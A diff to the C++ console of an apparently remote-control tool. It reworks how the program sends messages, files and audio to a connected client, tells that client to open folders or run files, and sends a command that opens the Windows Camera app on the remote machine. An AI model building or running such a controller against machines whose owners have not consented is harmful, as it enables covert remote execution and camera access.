@@ -66,21 +66,21 @@ int main() {
             std::cout << CONSOLE_PREFIX << " Type /back to return to the menu.\n";
 
             while(true) {
-                std::string cmd;
+                std::string txt;
                 std::cout << CONSOLE_PREFIX << " Type here: ";
-                std::getline(std::cin, cmd);
+                std::getline(std::cin, txt);
 
-                if(cmd == "/back") {
+                if(txt == "/back") {
                     int back = TYPE_BACK;
                     bytesSend = send(clientFileDescriptor, &back, sizeof(back), 0);
                     break;
-                } else if (cmd.empty()) {
+                } else if (txt.empty()) {
                     continue;
                 }
 
-                int msg = TYPE_TEXT;
-                bytesSend = send(clientFileDescriptor, &msg, sizeof(msg), 0);
-                bytesSend = send(clientFileDescriptor, cmd.c_str(), cmd.length(), 0);
+                int type = TYPE_TEXT;
+                bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
+                bytesSend = send(clientFileDescriptor, txt.c_str(), txt.length(), 0);
 
                 bytesRec = recv(clientFileDescriptor, buffer, BUFFERSIZE, 0);
                 std::string clientRec(buffer, bytesRec);
@@ -89,14 +89,14 @@ int main() {
             }
         }
 
-        if(choice == TYPE_FILE) {           
+        if(choice == TYPE_FILE) {    
+            int type = TYPE_FILE;
+            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);       
             std::string path;
             std::cout << CONSOLE_PREFIX << " Enter path: ";
             std::getline(std::cin, path);
             std::cout << std::endl;
 
-            int type = TYPE_FILE;
-            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
             sendFile(clientFileDescriptor, path);
         }
 
@@ -123,6 +123,8 @@ int main() {
         }
 
         if(choice == TYPE_EXECUTE) {
+            int type = TYPE_EXECUTE;
+            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
             while(true) {
                 std::cout << CONSOLE_PREFIX << " 1 - Open a folder\n";
                 std::cout << CONSOLE_PREFIX << " 2 - Execute a file\n";
@@ -143,58 +145,62 @@ int main() {
 
                 switch(choice) {
                     case 1: {
+                        int subtype = 1;
+                        bytesSend = send(clientFileDescriptor, &subtype, sizeof(subtype), 0);
+
                         std::cout << CONSOLE_PREFIX << " Enter the path: ";
                         std::string path;
                         std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
                         std::getline(std::cin, path);
 
-                        int type = TYPE_EXECUTE;
-                        bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
-
-                        int subtype = 1;
-                        bytesSend = send(clientFileDescriptor, &subtype, sizeof(subtype), 0);
-
                         bytesSend = send(clientFileDescriptor, path.c_str(), path.length(), 0);
-
-                        std::cout << SUCCESS_PREFIX << " Sent folder cmd.\n";
+                        std::cout << PENDING_PREFIX << " Opening " << path << "...\n";  
+                        if(bytesSend <= 0) {
+                            std::cout << ERROR_PREFIX << " Failed to open " << path << std::endl;
+                            break;
+                        }
 
                         bytesRec = recv(clientFileDescriptor, buffer, sizeof(buffer), 0);
                         std::string msg(buffer, bytesRec);
 
-                        std::cout << SUCCESS_PREFIX << " " << msg << std::endl;
+                        std::cout << SUCCESS_PREFIX << msg << std::endl;
                         break;
                     }
 
                     case 2: {
-                        std::cout << CONSOLE_PREFIX << " Enter command: ";
-                        std::string cmd;
-                        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
-                        std::getline(std::cin, cmd);
-
-                        int type = TYPE_EXECUTE;
-                        bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
-
                         int subtype = 2;
                         bytesSend = send(clientFileDescriptor, &subtype, sizeof(subtype), 0);
+                        
+                        std::cout << CONSOLE_PREFIX << " Enter file name: ";
+                        std::string fileName;
+                        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+                        std::getline(std::cin, fileName);
 
-                        std::cout << PENDING_PREFIX << " Executing command '" << cmd << "'\n";
-                        bytesSend = send(clientFileDescriptor, cmd.c_str(), cmd.length(), 0);
+                        std::cout << PENDING_PREFIX << " Executing " << fileName << "...\n";
+                        bytesSend = send(clientFileDescriptor, fileName.c_str(), fileName.length(), 0);
+                        if(bytesSend <= 0) {
+                            std::cout << ERROR_PREFIX << " Failed to execute " << fileName << std::endl;
+                            break;
+                        }
 
-                        std::cout << SUCCESS_PREFIX << " Command: '" << cmd << "' executed\n";
+                        std::cout << SUCCESS_PREFIX << " " << fileName << " executed\n";
                         break;
                     }
 
                     case 3: {
-                        std::string cmd = "explorer.exe \"shell:AppsFolder\\Microsoft.WindowsCamera_8wekyb3d8bbwe!App\"";
-
-                        int type = TYPE_EXECUTE;
-                        bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
-
                         int subtype = 3;
                         bytesSend = send(clientFileDescriptor, &subtype, sizeof(subtype), 0);
 
+                        std::string cmd = "explorer.exe \"shell:AppsFolder\\Microsoft.WindowsCamera_8wekyb3d8bbwe!App\"";
+
+                        std::cout << PENDING_PREFIX << " Sending camera execution command...\n";
                         bytesSend = send(clientFileDescriptor, cmd.c_str(), cmd.length(), 0);
-                        std::cout << SUCCESS_PREFIX << " Sent camera execution cmd\n";
+                        if(bytesSend <= 0) {
+                            std::cout << ERROR_PREFIX << " Failed to send camera execution command\n";
+                            break;
+                        }
+
+                        std::cout << SUCCESS_PREFIX << " Sent camera execution command\n";
                         break;
                     }
                 }
@@ -204,14 +210,14 @@ int main() {
         }
 
         if(choice == TYPE_SOUND) {
+            int type = TYPE_SOUND;
+            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
+
             std::string path;
             std::cout << CONSOLE_PREFIX << " Enter audio path: ";
             std::getline(std::cin, path);
             std::cout << std::endl;
 
-            int type;
-            type = TYPE_SOUND;
-            bytesSend = send(clientFileDescriptor, &type, sizeof(type), 0);
             sendFile(clientFileDescriptor, path);
         }
 
